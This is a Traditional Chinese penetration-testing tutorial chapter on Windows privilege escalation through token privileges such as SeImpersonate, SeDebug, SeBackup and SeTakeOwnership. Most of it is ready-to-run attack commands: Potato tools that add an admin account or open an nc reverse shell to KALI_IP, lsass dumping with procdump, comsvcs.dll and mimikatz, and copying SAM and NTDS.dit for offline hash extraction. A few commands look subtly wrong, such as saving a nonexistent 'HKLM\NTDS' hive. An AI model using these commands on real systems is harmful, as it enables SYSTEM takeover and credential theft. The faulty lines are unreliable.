## 理論基礎：Windows Privilege

Windows 的特殊操作（如 debug 其他程序、模擬其他使用者身份）需要特定 Privilege。Privilege 是跟 Token 綁定的，不是跟群組。

```cmd
:: 查當前 token 的所有 privilege
whoami /priv
```

**最重要的 Privilege 對照：**

| Privilege | 原始設計用途 | 攻擊用途 |
|-----------|------------|---------|
| SeImpersonatePrivilege | 讓服務模擬用戶端身份（IIS/SQL） | Potato 系列提權到 SYSTEM |
| SeAssignPrimaryTokenPrivilege | 替換程序的主 token | 同上（備選路徑） |
| SeDebugPrivilege | Debug 其他程序 | dump lsass 記憶體取得 hash/ticket |
| SeBackupPrivilege | 備份時讀取任何檔案 | 讀 SAM/NTDS.DIT 取得 hash |
| SeRestorePrivilege | 還原時寫入任何位置 | 寫入任意位置（植入後門） |
| SeTakeOwnershipPrivilege | 取得任意物件的擁有權 | 搶奪受保護檔案/登錄機碼的擁有權 |
| SeLoadDriverPrivilege | 載入/卸載驅動程式 | 載入惡意驅動程式 → kernel 提權 |

## 攻擊一：Potato 系列（SeImpersonatePrivilege）

### 理論

`SeImpersonatePrivilege` 允許程式「模擬」另一個連線者的身份。Potato 攻擊建立一個假的 COM 服務或 named pipe，誘使 SYSTEM 帳號連線，再用 `SeImpersonatePrivilege` 偷 SYSTEM 的 token。

**適用情況**：你是以 IIS、SQL Server、Network Service 等服務帳號身份執行（這些帳號通常有 `SeImpersonatePrivilege`）。

```cmd
:: 確認有 SeImpersonatePrivilege
whoami /priv | findstr "SeImpersonatePrivilege"
:: 找到且 STATUS 是 Enabled 才能用

:: 工具一：GodPotato（推薦，最新，支援 Windows 10/11/Server 2022）
.\GodPotato.exe -cmd "cmd /c net localgroup Administrators MYUSER /add"
:: -cmd → 要執行的指令（以 SYSTEM 身份）

:: 或取得 reverse shell
.\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe KALI_IP 443 -e cmd.exe"

:: 工具二：JuicyPotatoNG（Server 2019/2022）
.\JuicyPotatoNG.exe -t * -p "C:\Temp\nc.exe" -a "KALI_IP 443 -e cmd.exe"
:: -t * → 自動選擇 token 類型（* = 嘗試所有）
:: -p   → 要執行的程式
:: -a   → 程式的參數

:: 工具三：PrintSpoofer（不同的 SYSTEM 誘使機制）
.\PrintSpoofer.exe -i -c cmd
:: -i → 互動式（維持 cmd 視窗）
:: -c cmd → 啟動 cmd（以 SYSTEM 身份）

.\PrintSpoofer.exe -c "net localgroup Administrators MYUSER /add"
```

## 攻擊二：SeDebugPrivilege → dump lsass

### 理論

`SeDebugPrivilege` 讓你可以 open/read/write 任何程序的記憶體，包含 `lsass.exe`（存放所有已登入使用者的憑證）。

```powershell
# Task Manager dump（需要 GUI 或 Invoke-WebRequest 上傳 procdump）
# 或用 PowerShell 直接 dump
$proc = Get-Process lsass
[System.Diagnostics.Process]::GetProcessById($proc.Id)

# 用 ProcDump
.\procdump.exe -ma lsass.exe lsass.dmp
:: -ma → Full memory dump（完整記憶體，包含所有模組）
:: lsass.exe → 目標程序名稱
:: lsass.dmp → 輸出檔案名稱

# 用 comsvcs.dll（無需額外工具）
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
:: comsvcs.dll MiniDump → 呼叫 comsvcs 的 MiniDump 函式
:: (Get-Process lsass).Id → lsass 的 PID
:: full → 完整 dump

# 取得 dump 後傳回 Kali 分析
# 在 Kali：
pypykatz lsa minidump lsass.dmp
:: 輸出：NT hash、明文密碼（若快取）、Kerberos ticket

# 或用 mimikatz（在 Windows 上）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
:: privilege::debug → 啟用 debug 權限
:: sekurlsa::logonpasswords → dump 所有登入使用者的憑證
```

## 攻擊三：SeBackupPrivilege → 讀 SAM/NTDS

### 理論

`SeBackupPrivilege` 允許以「備份」為由讀取任何檔案，繞過 ACL 限制。可以用來讀取 SAM（本機 hash）和 NTDS.DIT（域 hash）。

```cmd
:: 方法一：用 reg 指令匯出 SAM 和 SYSTEM hive
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
:: 或 NTDS（DC 上）
reg save HKLM\NTDS C:\Temp\NTDS 2>nul

:: 傳回 Kali 後解密
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
:: LOCAL → 表示用本地檔案（不是連線到目標）

:: 方法二：用 robocopy（繞過 ACL 讀取任意檔案）
robocopy /B C:\Windows\NTDS\ C:\Temp\ NTDS.dit
:: /B → Backup mode（啟用 SeBackupPrivilege 讀取）

:: 也需要 SYSTEM hive 才能解密 NTDS
robocopy /B C:\Windows\System32\config\ C:\Temp\ SYSTEM
```

## 攻擊四：SeTakeOwnershipPrivilege

```cmd
:: 搶奪檔案擁有權（然後改 ACL 給自己讀寫權限）
takeown /f "C:\Windows\System32\config\SAM"
:: /f → 指定要搶奪擁有權的檔案

:: 改 ACL 給自己完整控制
icacls "C:\Windows\System32\config\SAM" /grant MYUSER:F
:: /grant → 授予權限
:: MYUSER:F → F = Full Control

:: 現在就能讀取 SAM
copy "C:\Windows\System32\config\SAM" C:\Temp\
copy "C:\Windows\System32\config\SYSTEM" C:\Temp\
```

## 判斷邏輯

```
whoami /priv 看到什麼：

SeImpersonatePrivilege (Enabled)?
└── GodPotato / PrintSpoofer → SYSTEM

SeDebugPrivilege (Enabled)?
└── dump lsass → 取得 hash/ticket

SeBackupPrivilege (Enabled)?
└── reg save SAM+SYSTEM → secretsdump LOCAL

SeTakeOwnershipPrivilege (Enabled)?
└── takeown + icacls → 讀任意受保護檔案

SeLoadDriverPrivilege (Enabled)?
└── 第 87 章 → 核心級提權
```
